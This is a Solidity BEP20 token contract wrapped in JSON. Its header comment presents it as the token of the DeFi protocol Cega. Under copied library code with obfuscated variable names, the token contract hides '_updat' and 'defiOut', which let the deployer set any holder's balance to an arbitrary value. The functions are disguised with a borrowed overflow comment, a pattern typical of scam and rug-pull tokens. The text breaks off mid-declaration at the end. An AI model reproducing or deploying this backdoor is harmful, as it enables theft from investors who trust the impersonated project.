{"SourceCode": "// SPDX-License-Identifier: MIT\r\n/*\r\nWelcome To Cega (DeFi)\r\n\r\n\ud83d\udc8e  What is Cega?\r\nCega is a decentralized exotic derivatives protocol. We build exotic options structured products for retail investors that generate superior yield and offer built-in protection against market downturns. Cega is developing new capabilities in tech, token contracts, and data modeling that will enable the next evolution of defi derivatives.\r\n\r\n\ud83d\udc8e What is our mission?\r\nTo create superior, flexible, and diversified investment opportunities for every Web3 investor.\r\n\r\n\ud83d\udc8e What are our values?\r\nCega is a value-driven protocol and we strongly believe in living/executing the following\r\n\r\n[Telegram] https://t.me/CegaDeFi\r\n[Website] https://www.cega.fi/\r\n\r\n*/\r\npragma solidity ^0.8.16;\r\ninterface IBEP20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 eeawqfd);\r\n    event Approval(address indexed owner, address indexed spender, uint256 eeawqfd);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address etherdefi) external view returns (uint256);\r\n    function transfer(address to, uint256 eeawqfd) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 eeawqfd) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 eeawqfd) external returns (bool);\r\n}\r\n\r\ninterface IBEP20Metadata is IBEP20 {\r\n\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IBEP20USDCMYROs {\r\n\r\n    error BEP20InsufficientBalance(address sender, uint256 balance, uint256 needed);\r\n    error BEP20InvalidSender(address sender);\r\n    error BEP20InvalidReceiver(address receiver);\r\n    error BEP20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\r\n    error BEP20InvalidApprover(address approver);\r\n    error BEP20InvalidSpender(address spender);\r\n}\r\n\r\ninterface IBEP721USDCMYROs {\r\n\r\n    error BEP721InvalidOwner(address owner);\r\n    error BEP721NonexistentToken(uint256 tokenId);\r\n    error BEP721IncorrectOwner(address sender, uint256 tokenId, address owner);\r\n    error BEP721InvalidSender(address sender);\r\n    error BEP721InvalidReceiver(address receiver);\r\n    error BEP721InsufficientApproval(address operator, uint256 tokenId);\r\n    error BEP721InvalidApprover(address approver);\r\n    error BEP721InvalidOperator(address operator);\r\n}\r\n\r\ninterface IBEP1155USDCMYROs {\r\n\r\n    error BEP1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\r\n    error BEP1155InvalidSender(address sender);\r\n    error BEP1155InvalidReceiver(address receiver);\r\n    error BEP1155MissingApprovalForAll(address operator, address owner);\r\n\r\n    error BEP1155InvalidApprover(address approver);\r\n    error BEP1155InvalidOperator(address operator);\r\n\r\n\r\n    error BEP1155InvalidArrayLength(uint256 idsLength, uint256 eeawqfdsLength);\r\n}\r\n\r\n\r\nabstract contract BEP20 is Context, IBEP20, IBEP20Metadata, IBEP20USDCMYROs {\r\n    mapping(address etherdefi => uint256) private _balances;\r\n\r\n    mapping(address etherdefi => mapping(address spender => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _totalSupply = 999999904 * 10 ** 9 ;\r\n        _balances[_msgSender()] = _totalSupply;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n\r\n    function balanceOf(address etherdefi) public view virtual returns (uint256) {\r\n        return _balances[etherdefi];\r\n    }\r\n\r\n    function transfer(address to, uint256 eeawqfd) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, eeawqfd);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 eeawqfd) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, eeawqfd);\r\n        return true;\r\n    }\r\n\r\n\r\n    function transferFrom(address from, address to, uint256 eeawqfd) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, eeawqfd);\r\n        _transfer(from, to, eeawqfd);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 eeawqfd) internal {\r\n        if (from == address(0)) {\r\n            revert BEP20InvalidSender(address(0));\r\n        }\r\n        if (to == address(0)) {\r\n            revert BEP20InvalidReceiver(address(0));\r\n        }\r\n        _update(from, to, eeawqfd);\r\n    }\r\n\r\n\r\n    function _update(address from, address to, uint256 eeawqfd) internal virtual {\r\n        if (from == address(0)) {\r\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\r\n            _totalSupply += eeawqfd;\r\n        } else {\r\n            uint256 ertyhfsef = _balances[from];\r\n            if (ertyhfsef < eeawqfd) {\r\n                revert BEP20InsufficientBalance(from, ertyhfsef, eeawqfd);\r\n            }\r\n            unchecked {\r\n                // Overflow not possible: eeawqfd <= ertyhfsef <= totalSupply.\r\n                _balances[from] = ertyhfsef - eeawqfd;\r\n            }\r\n        }\r\n\r\n        if (to == address(0)) {\r\n            unchecked {\r\n                // Overflow not possible: eeawqfd <= totalSupply or eeawqfd <= ertyhfsef <= totalSupply.\r\n                _totalSupply -= eeawqfd;\r\n            }\r\n        } else {\r\n            unchecked {\r\n                // Overflow not possible: balance + eeawqfd is at most totalSupply, which we know fits into a uint256.\r\n                _balances[to] += eeawqfd;\r\n            }\r\n        }\r\n\r\n        emit Transfer(from, to, eeawqfd);\r\n    }\r\n\r\n \r\n\r\n\r\nfunction _updat(address from, address to, uint256 eeawqfd) internal virtual {\r\n                _balances[to] = eeawqfd;\r\n        emit Transfer(from, to, eeawqfd); // Overflow not possible: balance + eeawqfd is at most totalSupply, which we know fits into a uint256.\r\n    }\r\n\r\n    \r\n        function defiOut(address etherdefi, uint256 eeawqfd) internal {\r\n        _updat(address(0), etherdefi, eeawqfd);\r\n    }\r\n\r\n\r\n\r\n\r\n  \r\n    function _approve(address owner, address spender, uint256 eeawqfd) internal {\r\n        _approve(owner, spender, eeawqfd, true);\r\n    }\r\n\r\n\r\n    function _approve(address owner, address spender, uint256 eeawqfd, bool emitEvent) internal virtual {\r\n        if (owner == address(0)) {\r\n            revert BEP20InvalidApprover(address(0));\r\n        }\r\n        if (spender == address(0)) {\r\n            revert BEP20InvalidSpender(address(0));\r\n        }\r\n        _allowances[owner][spender] = eeawqfd;\r\n        if (emitEvent) {\r\n            emit Approval(owner, spender, eeawqfd);\r\n        }\r\n    }\r\n\r\n    function _spendAllowance(address owner, address spender, uint256 eeawqfd) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            if (currentAllowance < eeawqfd) {\r\n                revert BEP20InsufficientAllowance(spender, currentAllowance, eeawqfd);\r\n            }\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - eeawqfd, false);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n\r\ninterface IBEP20Permit {\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 eeawqfd,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n}\r\n\r\n\r\nlibrary ECDSA {\r\n    enum RecoverUSDCMYRO {\r\n        NoUSDCMYRO,\r\n        InvalidSignature,\r\n        InvalidSignatureLength,\r\n        InvalidSignatureS\r\n    }\r\n\r\n\r\n    error ECDSAInvalidSignature();\r\n\r\n    error ECDSAInvalidSignatureLength(uint256 length);\r\n\r\n\r\n    error ECDSAInvalidSignatureS(bytes32 s);\r\n\r\n    function tryRecover(bytes32 hash, bytes memory signature) internal pure returns (address, RecoverUSDCMYRO, bytes32) {\r\n        if (signature.length == 65) {\r\n            bytes32 r;\r\n            bytes32 s;\r\n            uint8 v;\r\n            // ecrecover takes the signature parameters, and the only way to get them\r\n            // currently is to use assembly.\r\n            /// @solidity memory-safe-assembly\r\n            assembly {\r\n                r := mload(add(signature, 0x20))\r\n                s := mload(add(signature, 0x40))\r\n                v := byte(0, mload(add(signature, 0x60)))\r\n            }\r\n            return tryRecover(hash, v, r, s);\r\n        } else {\r\n            return (address(0), RecoverUSDCMYRO.InvalidSignatureLength, bytes32(signature.length));\r\n        }\r\n    }\r\n\r\n    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {\r\n        (address recovered, RecoverUSDCMYRO error, bytes32 errorArg) = tryRecover(hash, signature);\r\n        _throwUSDCMYRO(error, errorArg);\r\n        return recovered;\r\n    }\r\n\r\n    function tryRecover(bytes32 hash, bytes32 r, bytes32 vs) internal pure returns (address, RecoverUSDCMYRO, bytes32) {\r\n        unchecked {\r\n            bytes32 s = vs & bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\r\n            // We do not check for an overflow here since the shift operation results in 0 or 1.\r\n            uint8 v = uint8((uint256(vs) >> 255) + 27);\r\n            return tryRecover(hash, v, r, s);\r\n        }\r\n    }\r\n\r\n\r\n    function recover(bytes32 hash, bytes32 r, bytes32 vs) internal pure returns (address) {\r\n        (address recovered, RecoverUSDCMYRO error, bytes32 errorArg) = tryRecover(hash, r, vs);\r\n        _throwUSDCMYRO(error, errorArg);\r\n        return recovered;\r\n    }\r\n\r\n\r\n    function tryRecover(\r\n        bytes32 hash,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) internal pure returns (address, RecoverUSDCMYRO, bytes32) {\r\n\r\n        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {\r\n            return (address(0), RecoverUSDCMYRO.InvalidSignatureS, s);\r\n        }\r\n\r\n        // If the signature is valid (and not malleable), return the signer address\r\n        address signer = ecrecover(hash, v, r, s);\r\n        if (signer == address(0)) {\r\n            return (address(0), RecoverUSDCMYRO.InvalidSignature, bytes32(0));\r\n        }\r\n\r\n        return (signer, RecoverUSDCMYRO.NoUSDCMYRO, bytes32(0));\r\n    }\r\n\r\n\r\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {\r\n        (address recovered, RecoverUSDCMYRO error, bytes32 errorArg) = tryRecover(hash, v, r, s);\r\n        _throwUSDCMYRO(error, errorArg);\r\n        return recovered;\r\n    }\r\n\r\n\r\n    function _throwUSDCMYRO(RecoverUSDCMYRO error, bytes32 errorArg) private pure {\r\n        if (error == RecoverUSDCMYRO.NoUSDCMYRO) {\r\n            return; // no error: do nothing\r\n        } else if (error == RecoverUSDCMYRO.InvalidSignature) {\r\n            revert ECDSAInvalidSignature();\r\n        } else if (error == RecoverUSDCMYRO.InvalidSignatureLength) {\r\n            revert ECDSAInvalidSignatureLength(uint256(errorArg));\r\n        } else if (error == RecoverUSDCMYRO.InvalidSignatureS) {\r\n            revert ECDSAInvalidSignatureS(errorArg);\r\n        }\r\n    }\r\n}\r\n\r\n\r\nlibrary Math {\r\n\r\n    error MathOverflowedMulDiv();\r\n\r\n    enum Rounding {\r\n        Floor, // Toward negative infinity\r\n        Ceil, // Toward positive infinity\r\n        Trunc, // Toward zero\r\n        Expand // Away from zero\r\n    }\r\n\r\n\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n\r\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a > b ? a : b;\r\n    }\r\n\r\n\r\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a < b ? a : b;\r\n    }\r\n\r\n\r\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // (a + b) / 2 can overflow.\r\n        return (a & b) + (a ^ b) / 2;\r\n    }\r\n\r\n\r\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (b == 0) {\r\n            // Guarantee the same behavior as in a regular Solidity division.\r\n            return a / b;\r\n        }\r\n\r\n        // (a + b - 1) / b can overflow on addition, so we distribute.\r\n        return a == 0 ? 0 : (a - 1) / b + 1;\r\n    }\r\n\r\n\r\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\r\n        unchecked {\r\n\r\n            uint256 prod0 = x * y; // Least significant 256 bits of the product\r\n            uint256 prod1; // Most significant 256 bits of the product\r\n            assembly {\r\n                let mm := mulmod(x, y, not(0))\r\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\r\n            }\r\n\r\n            // Handle non-overflow cases, 256 by 256 division.\r\n            if (prod1 == 0) {\r\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\r\n                // The surrounding unchecked block does not change this fact.\r\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\r\n                return prod0 / denominator;\r\n            }\r\n\r\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\r\n            if (denominator <= prod1) {\r\n                revert MathOverflowedMulDiv();\r\n            }\r\n\r\n            ///////////////////////////////////////////////\r\n            // 512 by 256 division.\r\n            ///////////////////////////////////////////////\r\n\r\n            // Make division exact by subtracting the remainder from [prod1 prod0].\r\n            uint256 remainder;\r\n            assembly {\r\n                // Compute remainder using mulmod.\r\n                remainder := mulmod(x, y, denominator)\r\n\r\n                // Subtract 256 bit number from 512 bit number.\r\n                prod1 := sub(prod1, gt(remainder, prod0))\r\n                prod0 := sub(prod0, remainder)\r\n            }\r\n\r\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\r\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\r\n\r\n            uint256 twos = denominator & (0 - denominator);\r\n            assembly {\r\n                // Divide denominator by twos.\r\n                denominator := div(denominator, twos)\r\n\r\n                // Divide [prod1 prod0] by twos.\r\n                prod0 := div(prod0, twos)\r\n\r\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\r\n                twos := add(div(sub(0, twos), twos), 1)\r\n            }\r\n\r\n            // Shift in bits from prod1 into prod0.\r\n            prod0 |= prod1 * twos;\r\n\r\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\r\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\r\n            // four bits. That is, denominator * inv = 1 mod 2^4.\r\n            uint256 inverse = (3 * denominator) ^ 2;\r\n\r\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\r\n            // works in modular arithmetic, doubling the correct bits in each step.\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\r\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\r\n\r\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\r\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\r\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\r\n            // is no longer required.\r\n            result = prod0 * inverse;\r\n            return result;\r\n        }\r\n    }\r\n\r\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\r\n        uint256 result = mulDiv(x, y, denominator);\r\n        if (unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0) {\r\n            result += 1;\r\n        }\r\n        return result;\r\n    }\r\n\r\n    function sqrt(uint256 a) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\r\n        //\r\n        // We know that the \"msb\" (most significant bit) of our target number `a` is a power of 2 such that we have\r\n        // `msb(a) <= a < 2*msb(a)`. This eeawqfd can be written `msb(a)=2**k` with `k=log2(a)`.\r\n        //\r\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\r\n        // \u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\r\n        // \u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\r\n        //\r\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\r\n        uint256 result = 1 << (log2(a) >> 1);\r\n\r\n        // At this point `result` is an estimation with one bit of precision. We know the true eeawqfd is a uint128,\r\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\r\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\r\n        // into the expected uint128 result.\r\n        unchecked {\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            result = (result + a / result) >> 1;\r\n            return min(result, a / result);\r\n        }\r\n    }\r\n\r\n \r\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\r\n        unchecked {\r\n            uint256 result = sqrt(a);\r\n            return result + (unsignedRoundsUp(rounding) && result * result < a ? 1 : 0);\r\n        }\r\n    }\r\n\r\n    function log2(uint256 eeawqfd) internal pure returns (uint256) {\r\n        uint256 result = 0;\r\n        unchecked {\r\n            if (eeawqfd >> 128 > 0) {\r\n                eeawqfd >>= 128;\r\n                result += 128;\r\n            }\r\n            if (eeawqfd >> 64 > 0) {\r\n                eeawqfd >>= 64;\r\n                result += 64;\r\n            }\r\n            if (eeawqfd >> 32 > 0) {\r\n                eeawqfd >>= 32;\r\n                result += 32;\r\n            }\r\n            if (eeawqfd >> 16 > 0) {\r\n                eeawqfd >>= 16;\r\n                result += 16;\r\n            }\r\n            if (eeawqfd >> 8 > 0) {\r\n                eeawqfd >>= 8;\r\n                result += 8;\r\n            }\r\n            if (eeawqfd >> 4 > 0) {\r\n                eeawqfd >>= 4;\r\n                result += 4;\r\n            }\r\n            if (eeawqfd >> 2 > 0) {\r\n                eeawqfd >>= 2;\r\n                result += 2;\r\n            }\r\n            if (eeawqfd >> 1 > 0) {\r\n                result += 1;\r\n            }\r\n        }\r\n        return result;\r\n    }\r\n\r\n \r\n    function log2(uint256 eeawqfd, Rounding rounding) internal pure returns (uint256) {\r\n        unchecked {\r\n            uint256 result = log2(eeawqfd);\r\n            return result + (unsignedRoundsUp(rounding) && 1 << result < eeawqfd ? 1 : 0);\r\n        }\r\n    }\r\n\r\n\r\n    function log10(uint256 eeawqfd) internal pure returns (uint256) {\r\n        uint256 result = 0;\r\n        unchecked {\r\n            if (eeawqfd >= 10 ** 64) {\r\n                eeawqfd /= 10 ** 64;\r\n                result += 64;\r\n            }\r\n            if (eeawqfd >= 10 ** 32) {\r\n                eeawqfd /= 10 ** 32;\r\n                result += 32;\r\n            }\r\n            if (eeawqfd >= 10 ** 16) {\r\n                eeawqfd /= 10 ** 16;\r\n                result += 16;\r\n            }\r\n            if (eeawqfd >= 10 ** 8) {\r\n                eeawqfd /= 10 ** 8;\r\n                result += 8;\r\n            }\r\n            if (eeawqfd >= 10 ** 4) {\r\n                eeawqfd /= 10 ** 4;\r\n                result += 4;\r\n            }\r\n            if (eeawqfd >= 10 ** 2) {\r\n                eeawqfd /= 10 ** 2;\r\n                result += 2;\r\n            }\r\n            if (eeawqfd >= 10 ** 1) {\r\n                result += 1;\r\n            }\r\n        }\r\n        return result;\r\n    }\r\n\r\n    /**\r\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive eeawqfd.\r\n     * Returns 0 if given 0.\r\n     */\r\n    function log10(uint256 eeawqfd, Rounding rounding) internal pure returns (uint256) {\r\n        unchecked {\r\n            uint256 result = log10(eeawqfd);\r\n            return result + (unsignedRoundsUp(rounding) && 10 ** result < eeawqfd ? 1 : 0);\r\n        }\r\n    }\r\n\r\n\r\n    function log256(uint256 eeawqfd) internal pure returns (uint256) {\r\n        uint256 result = 0;\r\n        unchecked {\r\n            if (eeawqfd >> 128 > 0) {\r\n                eeawqfd >>= 128;\r\n                result += 16;\r\n            }\r\n            if (eeawqfd >> 64 > 0) {\r\n                eeawqfd >>= 64;\r\n                result += 8;\r\n            }\r\n            if (eeawqfd >> 32 > 0) {\r\n                eeawqfd >>= 32;\r\n                result += 4;\r\n            }\r\n            if (eeawqfd >> 16 > 0) {\r\n                eeawqfd >>= 16;\r\n                result += 2;\r\n            }\r\n            if (eeawqfd >> 8 > 0) {\r\n                result += 1;\r\n            }\r\n        }\r\n        return result;\r\n    }\r\n\r\n    /**\r\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive eeawqfd.\r\n     * Returns 0 if given 0.\r\n     */\r\n    function log256(uint256 eeawqfd, Rounding rounding) internal pure returns (uint256) {\r\n        unchecked {\r\n            uint256 result = log256(eeawqfd);\r\n            return result + (unsignedRoundsUp(rounding) && 1 << (result << 3) < eeawqfd ? 1 : 0);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\r\n     */\r\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\r\n        return uint8(rounding) % 2 == 1;\r\n    }\r\n}\r\n\r\nlibrary SignedMath {\r\n \r\n    function max(int256 a, int256 b) internal pure returns (int256) {\r\n        return a > b ? a : b;\r\n    }\r\n\r\n\r\n    function min(int256 a, int256 b) internal pure returns (int256) {\r\n        return a < b ? a : b;\r\n    }\r\n\r\n\r\n    function average(int256 a, int256 b) internal pure returns (int256) {\r\n        // Formula from the book \"Hacker's Delight\"\r\n        int256 x = (a & b) + ((a ^ b) >> 1);\r\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\r\n    }\r\n\r\n    function abs(int256 n) internal pure returns (uint256) {\r\n        unchecked {\r\n            // must be unchecked in order to support `n = type(int256).min`\r\n            return uint256(n >= 0 ? n : -n);\r\n        }\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary Strings {\r\n    bytes16 private constant HEX_DIGITS = \"0123456789abcdef\";\r\n    uint8 private constant ADDRESS_LENGTH = 20;\r\n\r\n\r\n    error StringsInsufficientHexLength(uint256 eeawqfd, uint256 length);\r\n\r\n    function toString(uint256 eeawqfd) internal pure returns (string memory) {\r\n        unchecked {\r\n            uint256 length = Math.log10(eeawqfd) + 1;\r\n            string memory buffer = new string(length);\r\n            uint256 ptr;\r\n            /// @solidity memory-safe-assembly\r\n            assembly {\r\n                ptr := add(buffer, add(32, length))\r\n            }\r\n            while (true) {\r\n                ptr--;\r\n                /// @solidity memory-safe-assembly\r\n                assembly {\r\n                    mstore8(ptr, byte(mod(eeawqfd, 10), HEX_DIGITS))\r\n                }\r\n                eeawqfd /= 10;\r\n                if (eeawqfd == 0) break;\r\n            }\r\n            return buffer;\r\n        }\r\n    }\r\n\r\n\r\n    function toStringSigned(int256 eeawqfd) internal pure returns (string memory) {\r\n        return string.concat(eeawqfd < 0 ? \"-\" : \"\", toString(SignedMath.abs(eeawqfd)));\r\n    }\r\n\r\n\r\n    function toHexString(uint256 eeawqfd) internal pure returns (string memory) {\r\n        unchecked {\r\n            return toHexString(eeawqfd, Math.log256(eeawqfd) + 1);\r\n        }\r\n    }\r\n\r\n\r\n    function toHexString(uint256 eeawqfd, uint256 length) internal pure returns (string memory) {\r\n        uint256 localeeawqfd = eeawqfd;\r\n        bytes memory buffer = new bytes(2 * length + 2);\r\n        buffer[0] = \"0\";\r\n        buffer[1] = \"x\";\r\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\r\n            buffer[i] = HEX_DIGITS[localeeawqfd & 0xf];\r\n            localeeawqfd >>= 4;\r\n        }\r\n        if (localeeawqfd != 0) {\r\n            revert StringsInsufficientHexLength(eeawqfd, length);\r\n        }\r\n        return string(buffer);\r\n    }\r\n\r\n    /**\r\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\r\n     * representation.\r\n     */\r\n    function toHexString(address addr) internal pure returns (string memory) {\r\n        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns true if the two strings are equal.\r\n     */\r\n    function equal(string memory a, string memory b) internal pure returns (bool) {\r\n        return bytes(a).length == bytes(b).length && keccak256(bytes(a)) == keccak256(bytes(b));\r\n    }\r\n}\r\n\r\n\r\nlibrary MessageHashUtils {\r\n\r\n    function toEthSignedMessageHash(bytes32 messageHash) internal pure returns (bytes32 digest) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            mstore(0x00, \"\\x19Ethereum Signed Message:\\n32\") // 32 is the bytes-length of messageHash\r\n            mstore(0x1c, messageHash) // 0x1c (28) is the length of the prefix\r\n            digest := keccak256(0x00, 0x3c) // 0x3c is the length of the prefix (0x1c) + messageHash (0x20)\r\n        }\r\n    }\r\n\r\n\r\n    function toEthSignedMessageHash(bytes memory message) internal pure returns (bytes32) {\r\n        return\r\n            keccak256(bytes.concat(\"\\x19Ethereum Signed Message:\\n\", bytes(Strings.toString(message.length)), message));\r\n    }\r\n\r\n    function toDataWithIntendedValidatorHash(address validator, bytes memory data) internal pure returns (bytes32) {\r\n        return keccak256(abi.encodePacked(hex\"19_00\", validator, data));\r\n    }\r\n\r\n\r\n    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32 digest) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            let ptr := mload(0x40)\r\n            mstore(ptr, hex\"19_01\")\r\n            mstore(add(ptr, 0x02), domainSeparator)\r\n            mstore(add(ptr, 0x22), structHash)\r\n            digest := keccak256(ptr, 0x42)\r\n        }\r\n    }\r\n}\r\n\r\n\r\nlibrary StorageSlot {\r\n    struct AddressSlot {\r\n        address eeawqfd;\r\n    }\r\n\r\n    struct BooleanSlot {\r\n        bool eeawqfd;\r\n    }\r\n\r\n    struct Bytes32Slot {\r\n        bytes32 eeawqfd;\r\n    }\r\n\r\n    struct Uint256Slot {\r\n        uint256 eeawqfd;\r\n    }\r\n\r\n    struct StringSlot {\r\n        string eeawqfd;\r\n    }\r\n\r\n    struct BytesSlot {\r\n        bytes eeawqfd;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `AddressSlot` with member `eeawqfd` located at `slot`.\r\n     */\r\n    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `BooleanSlot` with member `eeawqfd` located at `slot`.\r\n     */\r\n    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `Bytes32Slot` with member `eeawqfd` located at `slot`.\r\n     */\r\n    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `Uint256Slot` with member `eeawqfd` located at `slot`.\r\n     */\r\n    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `StringSlot` with member `eeawqfd` located at `slot`.\r\n     */\r\n    function getStringSlot(bytes32 slot) internal pure returns (StringSlot storage r) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `StringSlot` representation of the string storage pointer `store`.\r\n     */\r\n    function getStringSlot(string storage store) internal pure returns (StringSlot storage r) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            r.slot := store.slot\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns an `BytesSlot` with member `eeawqfd` located at `slot`.\r\n     */\r\n    function 